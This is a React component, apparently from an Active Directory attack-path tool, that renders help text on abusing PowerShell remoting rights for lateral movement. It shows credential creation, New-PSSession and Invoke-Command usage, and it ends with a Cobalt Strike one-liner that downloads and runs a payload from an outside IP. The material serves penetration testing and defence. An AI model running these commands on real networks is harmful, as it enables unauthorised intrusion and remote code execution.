import React from 'react';
import PropTypes from 'prop-types';

const Abuse = ({sourceName, sourceType, targetName}) => {
    return (
        <>
            <p>
                Abuse of this privilege will require you to have interactive
                access with a system on the network.
            </p>
            <p>
                A remote session can be opened using the New-PSSession
                powershell command.
            </p>
            <p>
                You may need to authenticate to the Domain Controller as{' '}
                {sourceType === 'User'
                    ? `${sourceName} if you are not running a process as that user`
                    : `a member of ${sourceName} if you are not running a process as a member`}
                . To do this in conjunction with New-PSSession, first create a
                PSCredential object (these examples comes from the PowerView
                help documentation):
            </p>
            <pre>
                <code>
                    {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                        "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                </code>
            </pre>
            <p>
                Then use the New-PSSession command with the credential we just
                created:
            </p>
            <pre>
                <code>{`$session = New-PSSession -ComputerName ${targetName} -Credential $Cred`}</code>
            </pre>
            <p>This will open a powershell session on {targetName}.</p>
            <p>
                You can then run a command on the system using the
                Invoke-Command cmdlet and the session you just created
            </p>
            <pre>
                <code>
                    {
                        'Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}'
                    }
                </code>
            </pre>
            <p>
                Cleanup of the session is done with the Disconnect-PSSession and
                Remove-PSSession commands.
            </p>
            <pre>
                <code>
                    {'Disconnect-PSSession -Session $session\n' +
                        'Remove-PSSession -Session $session'}
                </code>
            </pre>
            <p>
                An example of running through this cobalt strike for lateral
                movement is as follows:
            </p>
            <pre>
                <code>
                    {
                        "powershell $session =  New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $session -ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))}; Disconnect-PSSession -Session $session; Remove-PSSession -Session $session"
                    }
                </code>
            </pre>
        </>
    );
};

Abuse.propTypes = {
    sourceName: PropTypes.string,
    sourceType: PropTypes.string,
    targetName: PropTypes.string,
};

export default Abuse;
